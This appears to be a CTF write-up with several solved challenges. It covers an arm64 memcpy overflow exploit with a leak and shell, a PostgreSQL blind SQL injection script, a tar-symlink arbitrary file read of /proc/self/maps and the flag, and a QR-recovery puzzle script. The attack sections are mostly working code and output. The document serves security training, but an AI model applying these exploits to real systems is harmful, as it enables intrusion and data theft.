⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠒⠄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀�\xa0\x80⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                               [ 44  7F  44  55  0B  7F  FE  F8 ]
                                                                               
                                                             7F        7F   55 


​                                                                               
                                                             0B   5A   7E   0A 


​                                                                               
                                                                  10        55 


​                                                                               
                                                   13   10        FE        44 


​                                                                               
                                                   7F   0A   FE   F8           
                                                                               
                                                                ┌───┐          
                                                 ────────────13─┤   ├──────────
                                                                └───┘          
                                                            $> $ q
$ id
uid=1000(samurai) gid=1000(samurai) groups=1000(samurai)
$ cat /flag
SCTF{ch4LL3N63_pwn3d!_Y0u'r3_br347h74K1N6!}
```

## echofrag

EchoFrag was an arm binary, that reads an input package, and depending on the type, it will either just echo the input back or store it into an `echo buffer`, which it will echo back when it's `full`.

The package we have to send looks like 

```c
struct Buffer {
	unsigned char Type;
	unsigned short Size;
	char Data[512]
}
```

```c
void handle_server()
{
    signed int cur_echo_off;
    unsigned int read_len;
    signed int echo_off;
    signed int echo_size;

    Buffer echo_buffer;
    Buffer input_buffer;
    
    memset(&echo_buffer, 0, 0x203);
    
    cur_echo_off = 3;
    
    while (true)
    {
        // Read package
        read_len = read(0, &input_buffer, 0x203);
    
        // Read package len must be >= 3
        if ((int)read_len <= 0)
            return -1;
    
        if (read_len <= 2)
            return -2;
    
        // Type 1: Unbuffered echo
        if (input_buffer.Type == 1)
        {
            if (input_buffer.Size + 3 > 0x203)
                return -3;
    
            // If buffer size is smaller than read bytes, echo it back
            if (input_buffer.Size + 3 <= read_len)
                do_write(&input_buffer);
    
            // Copy input buffer over echo_buffer (This will overwrite the size of echo_buffer!)
            memcpy(&echo_buffer, &input_buffer, (int)read_len);
    
            cur_echo_off = read_len;
        }
        // Type 2: Buffered echo
        else
        {
            // Find current offset in echo buffer to write to
            echo_off = cur_echo_off + read_len - 3; 
            echo_size = echo_buffer.size;           
    
            if (echo_off > echo_buffer.size)
            {
                read_len = echo_buffer.size - cur_echo_off;
                echo_off = echo_buffer.size;
            }
    
            // Copy data from input_buffer into echo_buffer
            memcpy(&echo_buffer.field_0 + cur_echo_off, input_buffer.Data, (int)(read_len - 3));
            
            cur_echo_off = echo_off;
    
            // If current offset in echo buffer is bigger than echo buffer size, echo it back
            if (echo_off >= echo_size)
            {
                cur_echo_off = 3;
                do_write(&echo_buffer);
            }
        }
    }
}

void do_write(Buffer *a1)
{
  write(1, a1->Data, a1->Size - 3);
}
```

Some things to note here

- When sending a package with type 1, the input package will be copied into `echo_buffer` (effectively overwriting its `size` with the one from the input package)
- When sending a package with type 2, only the data from the input package will be copied at the current offset (`cur_echo_off`) in the `echo_buffer` and increase the offset by the data size.
- When the offset would exceed the limit of the echo buffer, `read_len` will be limited to the remaining space in the buffer, so that it cannot be overflown.
- When the current offset equals the size of the echo buffer, it will be printed back.

Let's see how this looks on the stack

```
0x5501812890:	0x0000005500000c58	0x0000005501812af0
0x55018128a0:	0x0000005501812920	0x000000fd018148a4
0x55018128b0:	0x0000005501812d00	0x0000005500000c48 <= X / Return address 
0x55018128c0:	0x0000005501843a18	0x0000000301812e50
0x55018128d0:	0x0000005500000103	0x0000005500000000 <= X / cur_echo_off / read_len / echo_off
0x55018128e0:	0x0000010300000000	0x4141414141010001 <= echo_size (32bit) / Echo Buffer Start (Type/Size/Data)
0x55018128f0:	0x4141414141414141	0x4141414141414141
0x5501812900:	0x4141414141414141	0x4141414141414141
0x5501812910:	0x4141414141414141	0x4141414141414141
0x5501812920:	0x4141414141414141	0x4141414141414141
0x5501812930:	0x4141414141414141	0x4141414141414141
0x5501812940:	0x4141414141414141	0x4141414141414141
0x5501812950:	0x4141414141414141	0x4141414141414141
0x5501812960:	0x4141414141414141	0x4141414141414141
0x5501812970:	0x4141414141414141	0x4141414141414141
0x5501812980:	0x4141414141414141	0x4141414141414141
0x5501812990:	0x4141414141414141	0x4141414141414141
0x55018129a0:	0x4141414141414141	0x4141414141414141
0x55018129b0:	0x4141414141414141	0x4141414141414141
0x55018129c0:	0x4141414141414141	0x4141414141414141
0x55018129d0:	0x4141414141414141	0x4141414141414141
0x55018129e0:	0x4141414141414141	0x0000000000414141
0x55018129f0:	0x0000000000000000	0x0000000000000000
0x5501812a00:	0x0000000000000000	0x0000000000000000
0x5501812a10:	0x0000000000000000	0x0000000000000000
0x5501812a20:	0x0000000000000000	0x0000000000000000
0x5501812a30:	0x0000000000000000	0x0000000000000000
0x5501812a40:	0x0000000000000000	0x0000000000000000
0x5501812a50:	0x0000000000000000	0x0000000000000000
0x5501812a60:	0x0000000000000000	0x0000000000000000
0x5501812a70:	0x0000000000000000	0x0000000000000000
0x5501812a80:	0x0000000000000000	0x0000000000000000
0x5501812a90:	0x0000000000000000	0x0000000000000000
0x5501812aa0:	0x0000000000000000	0x0000000000000000
0x5501812ab0:	0x0000000000000000	0x0000000000000000
0x5501812ac0:	0x0000000000000000	0x0000000000000000
0x5501812ad0:	0x0000000000000000	0x0000000000000000
0x5501812ae0:	0x0000000000000000	0x0000000000000000
0x5501812af0:	0x4141414141010001	0x4141414141414141 <= Input buffer start
0x5501812b00:	0x4141414141414141	0x4141414141414141
0x5501812b10:	0x4141414141414141	0x4141414141414141
0x5501812b20:	0x4141414141414141	0x4141414141414141
0x5501812b30:	0x4141414141414141	0x4141414141414141
0x5501812b40:	0x4141414141414141	0x4141414141414141
0x5501812b50:	0x4141414141414141	0x4141414141414141
0x5501812b60:	0x4141414141414141	0x4141414141414141
0x5501812b70:	0x4141414141414141	0x4141414141414141
0x5501812b80:	0x4141414141414141	0x4141414141414141
0x5501812b90:	0x4141414141414141	0x4141414141414141
```

So from a first glance, it seems, that we cannot write data outside of those two buffers. But while playing around with some test data and lengths, the binary suddenly crashed in the `memcpy` into the `echo_buffer`.

This arised, because I didn't send a package type 1, which would have initialized the size of `echo_buffer` (which is in the beginning just 0).

```c
echo_off = cur_echo_off + read_len - 3;           // echo_off = 3 + read bytes -3 = read_bytes
echo_size = echo_buffer.size;                     // echo_size = 0

if (echo_off > echo_buffer.size)                  // will always be true for zero size buffer
{
    read_len = echo_buffer.size - cur_echo_off;   // read_len = 0 - last read byte count (will be negative)
    echo_off = echo_buffer.size                   // echo_off = 0
}

// Copy data from input_buffer into echo_buffer
memcpy(&echo_buffer.field_0 + cur_echo_off, input_buffer.Data, (int)(read_len - 3));
            
// Store echo_off back into cur_echo_off
cur_echo_off = echo_off;
```

Since the now negative `read_len` is casted to `int`, `memcpy` will be called with a size of `-6`

```
───────────────────────────────────────────────────────────────────────────────────── registers ────
$x0  : 0x00000055018128eb  →  0x0000000000000000  →  0x0000000000000000
$x1  : 0x0000005501812af3  →  0x0000004242424242  →  0x0000004242424242
$x2  : 0xfffffffffffffffa  →  0xfffffffffffffffa
$x3  : 0x00000055018128eb  →  0x0000000000000000  →  0x0000000000000000
$x4  : 0x0000005501812af3  →  0x0000004242424242  →  0x0000004242424242
....
$sp  : 0x00000055018128b0  →  0x0000005501812d00  →  0x0000005501812d10  →  0x0000000000000000  →  0x0000000000000000
$pc  : 0x0000005500000bc4  →  0xb94027a097ffff17  →  0xb94027a097ffff17
$cpsr: [negative zero CARRY overflow interrupt fast]
$fpsr: 0x0000000000000000  →  0x0000000000000000
$fpcr: 0x0000000000000000  →  0x0000000000000000
──────────────────────────────────────────────────────────────────────────────── code:arm64:ARM ────
   0x5500000bb8                  mov    x2,  x0
   0x5500000bbc                  mov    x1,  x4
   0x5500000bc0                  mov    x0,  x3
 → 0x5500000bc4                  bl     0x5500000820 <memcpy@plt>
   ↳  0x5500000820 <memcpy@plt+0>   adrp   x16,  0x5500010000
      0x5500000824 <memcpy@plt+4>   ldr    x17,  [x16,  #3920]
      0x5500000828 <memcpy@plt+8>   add    x16,  x16,  #0xf50
      0x550000082c <memcpy@plt+12>  br     x17
      0x5500000830 <setbuf@plt+0>   adrp   x16,  0x5500010000
      0x5500000834 <setbuf@plt+4>   ldr    x17,  [x16,  #3928]
───────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00000055018128b0│+0x0000: 0x0000005501812d00  →  0x0000005501812d10  →  0x0000000000000000  →  0x0000000000000000	 ← $x29, $sp
0x00000055018128b8│+0x0008: 0x0000005500000c48  →  0xa8c17bfd52800000  →  0xa8c17bfd52800000
0x00000055018128c0│+0x0010: 0x0000005501843a18  →  0x0000005501813000  →  0x00010102464c457f  →  0x00010102464c457f
0x00000055018128c8│+0x0018: 0x0000000301812e50  →  0x0000000301812e50
0x00000055018128d0│+0x0020: 0x00000000fffffffd  →  0x00000000fffffffd
0x00000055018128d8│+0x0028: 0x0000000300000000  →  0x0000000300000000
─────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
memcpy@plt (
   $x0 = 0x00000055018128eb → 0x0000000000000000 → 0x0000000000000000,
   $x1 = 0x0000005501812af3 → 0x0000004242424242 → 0x0000004242424242,
   $x2 = 0xfffffffffffffffa → 0xfffffffffffffffa
)
{% endhighlight %}

This should copy our `input_buffer` (`0x0000005501812af3`) into the `echo_buffer` (`0x00000055018128eb`). Let's check the memory around the `echo_buffer` before `memcpy` is executed.

{% highlight text %}
gef➤  x/30gx 0x00000055018128eb-0x4b
0x55018128a0:	0x0000005501812920	0x00000055018148a4
0x55018128b0:	0x0000005501812d00	0x0000005500000c48 <= X / return address
0x55018128c0:	0x0000005501843a18	0x0000000301812e50
0x55018128d0:	0x00000000fffffffd	0x0000000300000000
0x55018128e0:	0x0000000000000000	0x0000000000000000 <= echo_size (32bit) / Echo Buffer Start (Type/Size/Data)
0x55018128f0:	0x0000000000000000	0x0000000000000000
0x5501812900:	0x0000000000000000	0x0000000000000000
0x5501812910:	0x0000000000000000	0x0000000000000000
0x5501812920:	0x0000000000000000	0x0000000000000000
0x5501812930:	0x0000000000000000	0x0000000000000000
0x5501812940:	0x0000000000000000	0x0000000000000000
```

And now, after the `memcpy` with its huge (negative) size was executed.

```
gef➤  x/30gx 0x00000055018128eb-0x4b
0x55018128a0:	0x0000005501812920	0x0000000000000000
0x55018128b0:	0x0000000000000000	0x0000000000000000 <= X / return address
0x55018128c0:	0x0000000000000000	0x0000000000000000
0x55018128d0:	0x0000000000000000	0x0000000000000000
0x55018128e0:	0x0000000000000000	0x4242424242000000 <= echo_size (32bit) / Echo Buffer Start (Type/Size/Data)
0x55018128f0:	0x0000000000000000	0x0000000000000000
0x5501812900:	0x0000000000000000	0x0000005501842ed0
0x5501812910:	0x0000000000000000	0x0000000000000000
0x5501812920:	0x0000000000000000	0x0000000000000000
0x5501812930:	0x0000000000000000	0x0000000000000000
0x5501812940:	0x0000000000000000	0x0000000000000000
```

Uh oh, it seems `memcpy` has kinda overflown its offset while copying the data and also overwritten the data *before* the `echo_buffer` overwriting our state stack variables and even the return address of the function itself.

Let's see, if we can control that overflown data.

```python
# prepare payload
payload = cyclic_metasploit(0x200-8)

# prepare size of echo_buffer to do a valid copy
pkg1(len(payload)+8, "")
	
# copy payload into echo_buffer (with valid size)
pkg2(0, payload)

# overwrite echo buffer size with 0
pkg1(0, "")

# trigger negative memcpy
pkg2(0, "")
```

This will first do a valid copy into echo buffer with our payload, then overwrite the size of the echo buffer with `0` and trigger the negative `memcpy`.

```
gef➤  x/30gx 0x00000055018128eb-0x4b
0x55018128a0:	0x3070415501812920	0x7041327041317041
0x55018128b0:	0x4135704134704133	0x3870413770413670 <= X / return address
0x55018128c0:	0x7141307141397041	0x4133714132714131
0x55018128d0:	0x3671413571413471	0x0000000000377141
0x55018128e0:	0x0000000000000000	0x6141306141000001 <= echo_size (32bit) / Echo Buffer Start (Type/Size/Data)
0x55018128f0:	0x4133614132614131	0x3661413561413461
0x5501812900:	0x6141386141376141	0x4131624130624139
0x5501812910:	0x3462413362413262	0x6241366241356241
0x5501812920:	0x4139624138624137	0x3263413163413063
0x5501812930:	0x6341346341336341	0x4137634136634135
0x5501812940:	0x3064413963413863	0x6441326441316441
0x5501812950:	0x4135644134644133	0x3864413764413664
0x5501812960:	0x6541306541396441	0x4133654132654131
0x5501812970:	0x3665413565413465	0x6541386541376541
0x5501812980:	0x4131664130664139	0x3466413366413266
```

Ok, so we can overwrite the return address with our input. At this point, this *could* have been finished already, since the addresses in the binary will always be fixed...

But it was tired at that point and just wrote a payload, which gave me a local shell, but didn't work remote...

```python
# prepare payload
payload = "A"*469
payload += p64(0x5500000A28)
	
# prepare size of echo_buffer to do a valid copy
pkg1(len(payload)+8, "")
	
# copy payload into echo_buffer (with valid size)
pkg2(0, payload)
	
# overwrite echo buffer size with 0
pkg1(0, "")

pkg2(0, "")
	
print("Enter to trigger shell")
```

```
$ python writeup.py 
[+] Starting local process '/usr/bin/qemu-aarch64': pid 17329
[17329]
[*] Paused (press any to continue)
[*] Switching to interactive mode
$ 
[*] Interrupted
[*] Switching to interactive mode
$ 
[*] Interrupted
[*] Switching to interactive mode
$ 
[*] Interrupted
[*] Switching to interactive mode
$ 
[*] Interrupted
Enter to trigger shell
[*] Switching to interactive mode
$ 
$ ls
EchoFrag
xpl.py
$  
```

Yep, shell working, just grab the flag... But the exploit crashed remote all the time...

Spoiler: I used `0x5500000000` as base address, which it is in my local qemu env, but remote the base address was `0x4000000000` (but also static).

At that point, I made a dreadful decision:

```
$ checksec ./EchoFrag
[*] '/home/kileak/ctf/ssf/echofrag/EchoFrag'
    Arch:     aarch64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Ah, sure, `PIE enabled`, I have to leak an address and calculate the base address... 

Getting a leak took a lot more time, than the complete shell exploit itself, though :(

I'll not get too much into detail, on how the `memcpy`s will do this, but the idea is to overwrite `echo_buffer.size` with a very big value and trigger the `echo`, so that it will just print out everything also behind `input_buffer` where some pie addresses were stored.

```python
# leak		
payload = "A"*489
payload += p32(0xffffffff-0x10)	
payload += "C"*(0x200-len(payload))

# overwrite echo buffer size	
pkg1(len(payload), "A"*4)

# copy payload into echo buffer
pkg2(0, payload)

# reset echo buffer size to 0
pkg1(0, "A"*4)

# trigger negative memcpy overwriting buffer state variables
pkg2(0, "XXXX")			

# trigger negative memcpy again to overwrite current offset of echo buffer
payload = "\x00" + p32(0x10101010) + p32(0x20202020)
payload += p64(0x30)

pkg2(0, payload)		

# trigger negative memcpy again to overwrite echo buffer size with 0x600 and trigger echo
payload = "A"+p16(0x600)+cyclic_metasploit(0x40)
pkg2(0, payload, False)	
	
# read echo buffer[0:0x600]
LEAK = r.recv(0x5f0)
	
# get PIE from leaked data
PIE = u64(LEAK[0x445:0x445+8])
BASE = PIE - 0x8e0
	
log.info("PIE    : %s" % hex(PIE))
log.info("BASE   : %s" % hex(BASE))
{% endhighlight %}

This took way longer than expected, but with this finally armed, I wanted to see how the remote addresses looked like.
```

```
[+] Opening connection to echofrag.sstf.site on port 31513: Done
[*] Switching to interactive mode
$ 
[*] Interrupted
[*] Switching to interactive mode
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���\xffCCCCCCCCC\x00\x00
[*] Interrupted
[*] Switching to interactive mode
$ 
[*] Interrupted
[*] Switching to interactive mode
$ 
[*] Interrupted
[*] Switching to interactive mode
$ 
[*] Interrupted
[*] PIE    : 0x40000008e0
[*] BASE   : 0x4000000000
[*] Switching to interactive mode
\x00\x00\x00/\x81\x00\x00\x00$  
```

Ok, that address was obviously *not* randomized and it struck me that the past hours were just wasted, but well...

Let it go, just attach the previous exploit to it and:

```
[+] Opening connection to echofrag.sstf.site on port 31513: Done
[*] Switching to interactive mode
$ 
[*] Interrupted
[*] Switching to interactive mode
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���\xffCCCCCCCCC\x00\x00
[*] Interrupted
[*] Switching to interactive mode
$ 
[*] Interrupted
[*] Switching to interactive mode
$ 
[*] Interrupted
[*] Switching to interactive mode
$ 
[*] Interrupted
[*] PIE    : 0x40000008e0
[*] BASE   : 0x4000000000
[*] Switching to interactive mode
\x00\x00\x00/\x81\x00\x00\x00$ 
[*] Interrupted
[*] Switching to interactive mode
$ 
[*] Interrupted
[*] Switching to interactive mode
$ 
[*] Interrupted
[*] Switching to interactive mode
$ 
[*] Interrupted
[*] Switching to interactive mode
$ 
[*] Interrupted
Enter to trigger shell
[*] Switching to interactive mode
$ 
$ id
uid=1000(prob) gid=1000(prob) groups=1000(prob)
$ ls
EchoFrag
FLAG
$ cat FLAG
SCTF{What_a_Beauty_0F_MEmCpY!!}
[*] Got EOF while reading in interactive
```

## Poxe_Center

In the page, `sortName` and `sortFlag` has the SQL Injection vulnerability. The server uses Postgresql and I made a payload using `limit` trick.

The page will show the `active` when we limit n (`n` must not be 0). When I reached to `0`, server will not return `active`.

```python
import requests

flag = ''

for i in range(1,100000):
    for j in range(32,128):
        assert j != 127
        #conn = requests.get('http://poxecenter.sstf.site:31888/demo/getGochaList?sortName=1%20limit%20(select%20(select%20ascii(substr(ARRAY_TO_STRING(ARRAY_AGG(column_name),%27,%27),'+str(i)+',1))%20from%20information_schema.columns%20where%20table_schema%20like%20\'pu%25\'%20and%20table_name%20like%20\'poke%25\')-'+str(j)+')&sortFlag=')
        col = 'second_attribute'
        tb = 'poke_info'
        conn = requests.get('http://poxecenter.sstf.site:31888/demo/getGochaList?sortName=1%20limit%20(select%20(select%20ascii(substr(ARRAY_TO_STRING(ARRAY_AGG('+col+'),%27,%27),'+str(i)+',1))%20from%20'+tb+'%20where%20'+col+'%20like%20\'SCTF%25\')-'+str(j)+')&sortFlag=')
        if 'ACTIVE' not in conn.text:
            flag += chr(j)
            print(flag)
            break
```

So, final payload is like below. I used `like` for getting flag.

## memory

We are able to create `tar` file with symlinks point to any file, so we basically have arbitrary file read, we just don't know where the flag is. We're trying to create a file pointing to `/proc/self/maps` to see the folder where the binary is running. We creating the `tar` file and upload with this script below.

```
➜  memory ln -s /proc/self/maps ./
➜  memory tar cvfP backup.tar maps
maps
```

and then upload the `backup.tar` by automatically interacting with the service using this script.

``` python
from pwn import *
from hashlib import sha256
from base64 import b64encode, b64decode

p = remote("memory.sstf.site", 31339)

def create_bak(tarfile):
	c = b""
	with open(tarfile, "rb") as f:
		c += b"SCTF"
		data = f.read()
		c += p32(len(data))
		c += sha256(data).digest()
		c += data
	return b64encode(c)

def menu(n):
	p.sendlineafter("menu : ", str(n))
	return

bak = create_bak("backup.tar")
menu(5)
p.sendlineafter(": ", str(len(bak)))
p.sendlineafter(": ", bak)
menu(3)
p.interactive()
```

Running the binary, it will shows us the content or `/proc/self/maps`.

```sh
➜  memory python3 s.py
[+] Opening connection to memory.sstf.site on port 31339: Done
[*] Switching to interactive mode
2021-07-18
Search module development
it's raining
2021-07-23
prepairing for a meeting
very hard day
2021-07-27
review projects
maps
5608103c7000-5608103c9000 r--p 00000000 ca:01 1026328                    /prob/prob
5608103c9000-5608103cc000 r-xp 00002000 ca:01 1026328                    /prob/prob
5608103cc000-5608103cd000 r--p 00005000 ca:01 1026328                    /prob/prob
5608103cd000-5608103ce000 r--p 00005000 ca:01 1026328                    /prob/prob
5608103ce000-5608103cf000 rw-p 00006000 ca:01 1026328                    /prob/prob
5608118cc000-5608118ed000 rw-p 00000000 00:00 0                          [heap]
7f43da7a4000-7f43da7be000 r-xp 00000000 ca:01 257055                     /lib/x86_64-linux-gnu/libpthread-2.27.so
7f43da7be000-7f43da9bd000 ---p 0001a000 ca:01 257055                     /lib/x86_64-linux-gnu/libpthread-2.27.so
7f43da9bd000-7f43da9be000 r--p 00019000 ca:01 257055                     /lib/x86_64-linux-gnu/libpthread-2.27.so
7f43da9be000-7f43da9bf000 rw-p 0001a000 ca:01 257055                     /lib/x86_64-linux-gnu/libpthread-2.27.so
7f43da9bf000-7f43da9c3000 rw-p 00000000 00:00 0
7f43da9c3000-7f43dabaa000 r-xp 00000000 ca:01 256994                     /lib/x86_64-linux-gnu/libc-2.27.so
7f43dabaa000-7f43dadaa000 ---p 001e7000 ca:01 256994                     /lib/x86_64-linux-gnu/libc-2.27.so
7f43dadaa000-7f43dadae000 r--p 001e7000 ca:01 256994                     /lib/x86_64-linux-gnu/libc-2.27.so
7f43dadae000-7f43dadb0000 rw-p 001eb000 ca:01 256994                     /lib/x86_64-linux-gnu/libc-2.27.so
7f43dadb0000-7f43dadb4000 rw-p 00000000 00:00 0
7f43dadb4000-7f43dadb7000 r-xp 00000000 ca:01 257004                     /lib/x86_64-linux-gnu/libdl-2.27.so
7f43dadb7000-7f43dafb6000 ---p 00003000 ca:01 257004                     /lib/x86_64-linux-gnu/libdl-2.27.so
7f43dafb6000-7f43dafb7000 r--p 00002000 ca:01 257004                     /lib/x86_64-linux-gnu/libdl-2.27.so
7f43dafb7000-7f43dafb8000 rw-p 00003000 ca:01 257004                     /lib/x86_64-linux-gnu/libdl-2.27.so
7f43dafb8000-7f43db253000 r-xp 00000000 ca:01 260072                     /usr/lib/x86_64-linux-gnu/libcrypto.so.1.1
7f43db253000-7f43db452000 ---p 0029b000 ca:01 260072                     /usr/lib/x86_64-linux-gnu/libcrypto.so.1.1
7f43db452000-7f43db47e000 r--p 0029a000 ca:01 260072                     /usr/lib/x86_64-linux-gnu/libcrypto.so.1.1
7f43db47e000-7f43db480000 rw-p 002c6000 ca:01 260072                     /usr/lib/x86_64-linux-gnu/libcrypto.so.1.1
7f43db480000-7f43db483000 rw-p 00000000 00:00 0
7f43db483000-7f43db4ac000 r-xp 00000000 ca:01 256976                     /lib/x86_64-linux-gnu/ld-2.27.so
7f43db6a6000-7f43db6aa000 rw-p 00000000 00:00 0
7f43db6ac000-7f43db6ad000 r--p 00029000 ca:01 256976                     /lib/x86_64-linux-gnu/ld-2.27.so
7f43db6ad000-7f43db6ae000 rw-p 0002a000 ca:01 256976                     /lib/x86_64-linux-gnu/ld-2.27.so
7f43db6ae000-7f43db6af000 rw-p 00000000 00:00 0
7ffdd5c0b000-7ffdd5c2c000 rw-p 00000000 00:00 0                          [stack]
7ffdd5c30000-7ffdd5c33000 r--p 00000000 00:00 0                          [vvar]
7ffdd5c33000-7ffdd5c34000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsyscall]
```

From the result, we guess the flag should be in `/prob` path, so we're trying to read `/prob/flag` or `/prob/flag.txt` by creating symlinks to that in tar file.

```bash
➜  memory ln -s /prob/flag /prob/flag.txt ./
➜  memory tar cvfP backup.tar flag flag.txt
flag
flag.txt
```

Running the python script again, the flag will shows up.

```bash
➜  memory python3 s.py
[+] Opening connection to memory.sstf.site on port 31339: Done
[*] Switching to interactive mode
2021-07-18
Search module development
it's raining
2021-07-23
prepairing for a meeting
very hard day
2021-07-27
review projects
flag
SCTF{B4CUP_R3ST0R3}
flag.txt
data/flag.txt not exist
=================
1.write
2.view
3.all view
4.backup data
5.restore data
6.exit
=================
input menu : $
```

# men in back hats

White points are suspicious.

After we saved a lot of results rotate in x/y/z in random degree, and found some qr-like image.

Then based on that rotation, we adjust the degree carefully and recover a qr code.

(rotx, roty, rotz) = (90, 37, 90)

```python
from PIL import Image, ImageDraw
from math import cos, sin, pi, ceil, floor
import random
st = [
    ...
    ]

clrs = [0xFFFFFF,       # white
        0x2FFFAD,       # greenyellow
        0x00D7FF,       # gold
        0xFFFFF0,       # azure
        0xFFFF00,       # cyan
        0x9314FF,       # deeppink
        0x0000FF,       # red
        0xB48246,       # steelblue
        0xFF0000,       # blue
        0x7A96E9,       # darksalmon
        0xFFFF0B,       # deepskyblue
        0x9AFA00,       # mediumspringreen
        0xE22B8A,       # blueviolet
        0x008cFF,       # darkorange
        0xCBC0FF,       # pink
        0x0045FF]       # orangered

rads = [1, 2, 3, 7, 12, 16]
   
# -----------------------------------------------------------------------
def rotz(p, a):
    a = (pi *  a/180)
    x,y,z = p[:3]
    _x = x * cos(a) - y * sin(a)
    _y = x * sin(a) + y * cos(a)
    _z = z
    return (_x,_y,_z) + p[3:]
    
def rotx(p, a):
    a = (pi *  a/180)
    x,y,z = p[:3]
    _z = z * cos(a) - y * sin(a)
    _y = z * sin(a) + y * cos(a)
    _x = x
    return (_x,_y,_z) + p[3:]

def roty(p, a):
    a = (pi *  a/180)
    x,y,z = p[:3]
    _z = z * cos(a) - x * sin(a)
    _x = z * sin(a) + x * cos(a)
    _y = y
    return (_x,_y,_z) + p[3:]

FACTOR=15

def drw_stars(bd, fn, rot1, rot2, rot3):
    
    lst = []
    xmin = 0x7fffffff
    xmax = -0x7ffffffff
    ymin = 0x7fffffff
    ymax = -0x7fffffff
    for x,y,z,d in bd:
        x,y,z,d = rotx((x,y,z,d),rot1)
        x,y,z,d = roty((x,y,z,d),rot2)
        x,y,z,d = rotz((x,y,z,d),rot3)
        
        c = clrs[d >> 4]
        if c != 0xFFFFFF: continue
        r = rads[d & 0x0F]        
        #print(r)
        lst.append((x,y))
        xmin = min(xmin,x)
        xmax = max(xmax,x)
        ymin = min(ymin,y)
        ymax = max(ymax,y)


    img = Image.new("RGB", (int(ymax-ymin+10)*FACTOR, int(xmax-xmin+10)*FACTOR), BKG)
    drw = ImageDraw.Draw(img, mode="RGB")
    for x,y in lst:
      for i in range(FACTOR):
        for j in range(FACTOR):
          drw.point(((x-xmin)*FACTOR+i,(y-ymin)*FACTOR+j),fill=0xFFFFFF)
    #img.show()
    img.save(fn)

#------------------------------------------------------------------------
#------------------------------------------------------------------------
IMG_W = 1000
IMG_H = 800
xC = IMG_W // 2
yC = IMG_H // 2
BKG = 0x101010

drw_stars(st, "task.png",90, 37, 90)
exit()



for i in range(20):
  drw_stars(st, f"x_task{i}.png",80+i, 37, 90)
  
exit()


while True:
  r1 = random.randint(0,360)
  r2 = random.randint(0,360)
  r3 = random.randint(0,360)
  
  drw_stars(st, "task.png", r1, r2, r3)
  print(r1,r2,r3)
  input()

```

## rc4

We note that RC4 is ultimately a stream cipher, so $C = P \oplus K$ with $K$ depending on our key. 

